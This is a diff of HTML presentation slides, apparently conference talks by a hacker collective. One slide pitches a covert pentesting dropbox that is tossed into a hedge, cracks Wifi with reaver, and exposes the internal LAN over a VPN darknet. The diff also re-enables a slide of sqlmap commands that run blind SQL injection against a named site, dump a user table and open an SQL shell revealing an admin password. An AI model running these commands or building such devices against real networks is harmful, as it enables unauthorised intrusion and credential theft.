@@ -40,11 +40,60 @@
 <body>
 <div id="slides">
     <div class="slide title">
-        <h1>How to accidentally <br/>shred a web app
-            <em><small>(while pen testing)</small></em></h1>
+        <h1>Der Heckenkrebs</br>
+            <em><small>Teil des Krebs Metaprojekts</small></em></h1>
         <br/>
         <p><a href="http://twitter.com/makefoo">@makefoo</a></p>
     </div>
+    <div class="slide">
+        <h1>Was Google denkt</h1>
+        <img src=heckenkrebs_google.png width=90%>
+    </div>
+    <div class="slide">
+        <h1>Heckenkrebs ist:</h1>
+        <h2>Eine mobile Pentesting Dropbox<h2>
+            </div>
+    
+    <div class="slide">
+        <h1>Platform:</h1>
+        <h2>TP-Link WR-703n mit Openwrt</h2>
+                <img src=https://lh6.googleusercontent.com/-j7s_fzJkEP8/UPMvE8YPHXI/AAAAAAAAAKg/WvaGHPDvgt4/s640/IMG_20130113_225119.jpg width=50%>
+    </div>
+    <div class="slide">
+        <h1>Software im Einsatz</h1>
+        <h2>
+<ul>
+<li>Tinc VPN</li>
+<li>aap + easybox patch</li>
+<li>reaver</li>
+</ul>
+               </h2>
+    </div>
+<div class="slide">
+                <h1>Ablauf:<h1>
+                        <h2><small>
+<ol>
+<li>Dropbox in die Hecke werfen</li>
+<li>Wifi connecten (optional:Wifi cracken)</li>
+<li>Gateway zum LAN vom Internet aus bereitstellen (retiolum darknet)</li>
+<li>???</li>
+<li>Profit!</li>
+</ol>
+                </small></h2>
+            </div>
+            <div class="slide">
+                <h1>Retiolum Darknet</h1>
+                <img
+                src=http://euer.krebsco.de/graphs/retiolum/retiolum_1.png
+                width=100%></img>
+    </div>
+    <div class="slide">
+        <h1>Danke<br/></h1>
+
+    <img width="20%" class="logo"
+        src="https://raw.github.com/krebscode/painload/master/cholerab/bling/krebs_plain.png"></object>
+    </div>
+    <!--
     <div class="slide">
         <h1><strong>@momorientes</strong>:<br/>Go ahead<br/>
             <a href="http://usa2011.olga-stift.de">http://usa2011.olga-stift.de</a></h1>
@@ -73,7 +122,7 @@
 </div>
 
 <div class="slide">
-<!--<h1>1(!) Blind SQL injection</h1>--!>
+<h1>1(!) Blind SQL injection</h1>
 <h2>sqlmap, i choose you!</h2> 
 <small>
     <pre>
@@ -85,9 +134,8 @@ $ sqlmap.py -u www.e1337epartner.de/pic_detailview.php?picid=31 \
 $ sqlmap.py -u www.e1337epartner.de/pic_detailview.php?picid=31 \
     &date=2011-04-21 --technique=T --common-columns -T userlist
 > Tables: username,passwort
-
 $ sqlmap.py -u www.e1337epartner.de/pic_detailview.php?picid=31 \
-    &date=2011-04-21 --sql-shell
+    &date=2011-04-21 - -sql-shell
 < select username,passwort from userlist
 > username: admin
 > passwort: $PLAINTEXT$
@@ -130,7 +178,6 @@ $ sqlmap.py -u www.e1337epartner.de/pic_detailview.php?picid=31 \
     <div class="slide">
     <object height="80%" class="logo" data="http://krebsco.de/krebs-v2.png"></object>
     </div>
-    <!--
 	<div class="slide">
 		<h1>Create simple, powerful presentations using just <strong>HTML</strong> and <strong>JavaScript</strong>.</h2>
 	</div>
